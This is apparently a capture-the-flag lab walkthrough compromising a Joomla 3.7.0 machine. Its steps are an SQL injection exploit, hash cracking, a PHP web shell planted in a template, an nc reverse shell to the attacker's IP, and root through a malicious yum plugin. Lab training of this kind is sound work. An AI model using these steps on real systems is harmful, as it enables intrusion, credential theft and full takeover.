# connect
```bash
export IP=10.10.17.52
```

# First of all
Bsic enumeration
```bash
mkdir nmap

nmap -sC -sV -oN nmap/initial $IP
```

```bash
mkdir gobuster

gobuster dir -u $IP -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/initial
```

# Joomla

version `3.7.0`

## Vuln
CVE : - CVE-2017-8917


## testing vuln
```bash
sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
### SQLmap did not worked for me

# joomblah
Found script joomblah in [ XiphosResearch /
exploits ](https://github.com/XiphosResearch/exploits) on github

```bash
python2 /opt/exploits/Joomblah/joomblah.py http://$IP
```

### It worked!
pwd hash for `jonah`
`$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

```bash
echo "$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm" > jonah.pwd
```

## JohnTheReaper
```bash
john --wordlist=/opt/SecLists/Passwords/rockyou.txt jonah.pwd
```

pws: `spiderman123`


## Login
http://10.10.17.52/administrator/

jonah:spiderman123

## create remote connection

Edit template `protostar`
index.php

Add to begining (after comment):

```php
system($_REQUEST['cmd']);
```

# connect
## Start Listener

```bash
nc -nlvp 8888
```

## exec shell
open URL in browser: http://10.10.17.52/?cmd=nc 10.8.3.38 8888 -e /bin/bash

* ! change nc <IP> to correct your machines IP addres.


## spawn sh after connection
```bahs
python -c 'import pty; pty.spawn("/bin/sh")'
```

# PrivEsc (to user)

```bash
ls -la home
```
Found user  `jjameson`

```bash
cat configuration.php
```
There is bunch of config options. There is couple of passwords varitnta.

Let's try to connect to ssh with them.

```bash
ssh jjameson@$IP
```
`$secret` - not it
`$password` - is matched! (nv5uz9r3ZEDzVjNu)

## Flag 1
```bash
cat user.txt
```


# PrivEsc (to root)
```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
sudo -l
```

Can run `yum` as sudo without password.

https://gtfobins.github.io/gtfobins/yum/


```bash
TF=$(mktemp -d)




cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF



sudo yum -c $TF/x --enableplugin=y
```

## I'm root!

## Flag 2
```bash
cat /root/root.txt
```
